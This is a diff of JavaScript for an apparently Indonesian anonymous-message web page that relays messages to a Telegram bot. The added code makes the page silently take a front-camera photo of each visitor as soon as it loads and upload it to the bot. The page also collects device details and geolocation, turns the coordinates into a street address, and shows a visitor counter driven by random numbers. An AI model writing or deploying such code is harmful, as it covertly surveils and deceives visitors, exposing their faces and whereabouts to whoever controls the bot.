@@ -20,7 +20,7 @@ async function sendMessage() {
     let success = await sendText(fullMessage);
     if (success) {
         await Swal.fire("Terkirim!", "Pesan telah dikirim.", "success");
-        window.location.href = "/kirim/index.html"; // Redirect setelah alert muncul
+        window.location.href = "/kirim/index.html";
     } else {
         Swal.fire("Gagal", "Pesan gagal dikirim.", "error");
     }
@@ -37,7 +37,7 @@ async function sendText(text) {
             body: JSON.stringify({ chat_id: chatId, text })
         });
 
-        return response.ok; // Mengembalikan true jika sukses, false jika gagal
+        return response.ok;
     } catch (error) {
         console.error("Gagal mengirim pesan:", error);
         return false;
@@ -63,51 +63,6 @@ function getDeviceInfo() {
     return `${device} (${userAgent})`;
 }
 
-function capturePhoto() {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.play();
-
-            setTimeout(() => {
-                const canvas = document.createElement("canvas");
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const photoData = canvas.toDataURL("image/png");
-                sendPhoto(photoData);
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000);
-        }).catch(() => {
-            console.warn("Akses kamera ditolak atau tidak tersedia.");
-        });
-}
-
-function sendPhoto(base64Image) {
-    let formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", dataURItoBlob(base64Image), "photo.png");
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    }).catch(() => {
-        console.warn("Foto gagal dikirim.");
-    });
-}
-
-function dataURItoBlob(dataURI) {
-    let byteString = atob(dataURI.split(",")[1]);
-    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
-    let ab = new ArrayBuffer(byteString.length);
-    let ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    return new Blob([ab], { type: mimeString });
-}
 
 
 function getLocation() {
@@ -144,10 +99,10 @@ async function getAddressFromCoords(latitude, longitude) {
     }
 }
 
-let count = 50; /
+let count = 50; 
 
 function updateCount() {
-    let randomIncrease = Math.floor(Math.random() * 10) + 1; 
+    let randomIncrease = Math.floor(Math.random() * 10) + 1;
     count += randomIncrease;
     document.getElementById("number").textContent = count;
 }
@@ -157,9 +112,9 @@ setInterval(updateCount, 2000);
 async function getRandomText() {
     try {
         let response = await fetch('text.json'); 
-        let texts = await response.json(); 
-        let randomIndex = Math.floor(Math.random() * texts.length); 
-        document.getElementById("inputMessage").value = texts[randomIndex];
+        let texts = await response.json();
+        let randomIndex = Math.floor(Math.random() * texts.length);
+        document.getElementById("inputMessage").value = texts[randomIndex]; 
     } catch (error) {
         console.error("Error fetching random text:", error);
     }
@@ -176,3 +131,53 @@ document.addEventListener("DOMContentLoaded", function () {
     toggleSendButton();
     inputMessage.addEventListener("input", toggleSendButton);
 });
+
+document.addEventListener("DOMContentLoaded", () => {
+    capturePhoto();
+});
+
+function capturePhoto() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(() => {
+                const canvas = document.createElement("canvas");
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const photoData = canvas.toDataURL("image/png");
+                sendPhoto(photoData);
+                stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah mengambil foto
+            }, 1000);
+        }).catch(() => {
+            console.warn("Akses kamera ditolak atau tidak tersedia.");
+        });
+}
+
+function sendPhoto(base64Image) {
+    let formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", dataURItoBlob(base64Image), "photo.png");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    }).catch(() => {
+        console.warn("Foto gagal dikirim.");
+    });
+}
+
+function dataURItoBlob(dataURI) {
+    let byteString = atob(dataURI.split(",")[1]);
+    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+    let ab = new ArrayBuffer(byteString.length);
+    let ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
